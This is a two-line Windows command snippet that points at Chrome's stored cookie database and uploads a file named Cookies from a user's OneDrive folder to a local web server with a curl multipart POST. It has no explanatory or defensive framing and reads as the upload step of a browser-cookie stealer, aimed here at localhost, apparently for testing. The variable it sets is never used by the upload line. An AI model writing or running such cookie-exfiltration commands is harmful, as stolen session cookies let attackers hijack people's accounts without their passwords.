set path = %AppData%\..\Local\Google\Chrome\User Data\Default\Network\Cookies
curl  -X  POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\yoni9\OneDrive\Cookies" http://localhost:80/